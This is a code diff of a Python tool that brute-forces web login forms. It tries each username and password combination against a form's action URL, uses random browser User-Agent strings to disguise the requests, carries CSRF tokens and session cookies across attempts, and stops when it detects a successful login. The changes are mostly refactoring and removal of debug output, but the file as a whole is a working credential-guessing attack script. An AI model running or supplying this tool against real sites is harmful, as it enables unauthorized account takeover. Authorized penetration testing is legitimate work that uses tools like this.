@@ -8,24 +8,20 @@ import ssl
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
 from html_similarity import style_similarity, structural_similarity, similarity
 
-success = False
-
 
 def brute(parameters, passwords):
     """
     sends all combinations for usernames and passwords to the attack function on the login page
     """
-    # return
+
     parameters["req_body_type"] = get_req_type(
         parameters["headers"], parameters["req_body"]
     )
-    print("up: " + str(parameters["req_body"]))
-
     for user in parameters["user_list"]:
         user = user.strip()
         user = user.split("\t")
         parameters["username"] = user[0]
-        for password in passwords:
+        for password in parameters['passwords']:
             password = password.strip()
             password = password.split("\t")
             parameters["password"] = password[0]
@@ -36,15 +32,13 @@ def attack(content):
     """
     create a packet containing fake headers and the payload(username,password) and submit it to the server
     """
-    print("[+ action url]: " + str(content["action"]))
-
     # build packet headers in order to disguise as a browser
     headers = content["headers"]
     headers["User-Agent"] = get_random_user_agent()
     res = requests.get(content["action"])
     soup = BeautifulSoup(res.text, "html.parser")
 
-    payload,cookies = change_cred(
+    payload, cookies = change_cred(
         content["req_body"],
         content["user_param"],
         content["password_param"],
@@ -53,24 +47,28 @@ def attack(content):
         content["req_body_type"],
         soup,
         content["tokens"],
-        content['set_cookie'],
-        res
+        content["set_cookie"],
+        res.cookies,
     )
-    if content['auth_type']:
-        if content['auth_type'] == 'basic':
-            auth = HTTPBasicAuth(content['username'], content['password'])
-        if content['auth_type'] == 'digest':
-            auth = HTTPDigestAuth(content['username'], content['password'])
+    if content["auth_type"]:
+        if content["auth_type"] == "basic":
+            auth = HTTPBasicAuth(content["username"], content["password"])
+        if content["auth_type"] == "digest":
+            auth = HTTPDigestAuth(content["username"], content["password"])
     print("[+ payload]: " + str(payload))
 
     if content["method"] == "post":
-        if content['set_cookie'] == 1:
-            resp = requests.post(content["action"], data=payload, cookies=cookies, auth=auth)
+        if content["set_cookie"] == 1:
+            resp = requests.post(
+                content["action"], data=payload, cookies=cookies, auth=auth
+            )
         else:
             resp = requests.post(content["action"], data=payload)
 
     else:
-        resp = requests.get(content["action"] + "/" + payload, headers=headers)
+        resp = requests.get(
+            content["action"] + "/" + payload, headers=headers
+        )  # not tested!
 
     print(
         "[+][attack] trying"
@@ -79,7 +77,6 @@ def attack(content):
         + " password:"
         + content["password"]
     )
-    print(resp.status_code)
 
     if check_login(resp, res):
         print(
@@ -88,8 +85,6 @@ def attack(content):
             + "\npassword: "
             + content["password"]
         )
-        global success
-        success = True
         sys.exit(1)
 
 
@@ -152,13 +147,10 @@ def get_req_type(header, req_body):
         return "JSON"
 
     elif "xml" in type:
-        import xmltodict
-
+        # import xmltodict
         return "XML"
 
     else:
-        import urllib
-
         return "URL_ENCODED"
 
 
@@ -172,44 +164,31 @@ def change_cred(
     soup,
     dynamic_list,
     set_cookie,
-    cookies
+    cookies_jar,
 ):
     if dynamic_list:
         for token in dynamic_list:
 
             inputs = soup.find("input", {"name": token})
             req_body[token] = inputs["value"]
-            
-        if set_cookie == 1:
-            req_body,cookies = change_cookiesToken(cookies, req_body)
-    
 
-    
+    if set_cookie == 1:
+        cookies = {}
+        for cookie in cookies_jar:
+            cookies[cookie.name] = cookie.value
+
+        for item in cookies.keys():
+            if item[1:] in req_body:
+                req_body[item[1:]] = cookies[item]
+            if item in req_body:
+                req_body[item] = cookies[item]
+        # if there is no cookies
+        if len(cookies) == 0:
+            cookies = None
+
     req_body[user_param] = username
     req_body[pass_param] = password
-
-    print("\n\n\n\n\n" + str(req_body) + "\n\n\n\n\n")
-    if req_body_type == "JSON":
-        return req_body
-
-    elif req_body_type == "XML":
+    if req_body_type == "XML":
         pass
-
-    elif req_body_type == "URL_ENCODED":
-        from urllib.parse import urlencode
-
-        return req_body,cookies  # convert from json to encoded
-
-def change_cookiesToken(cookies_jar, req_body):
-    cookies = {}
-    for cookie in cookies_jar:
-        cookies[cookie.name] = cookie.value
-
-    for item in cookies.keys():
-        if item[1:] in req_body:
-            req_body[item[1:]]= cookies[item]
-        if item in req_body:
-            req_body[item]= cookies[item]
-    if len(cookies) == 0:
-        cookies = None
-    return req_body,cookies
+    elif req_body_type == "JSON" or req_body_type == "URL_ENCODED":
+        return req_body, cookies
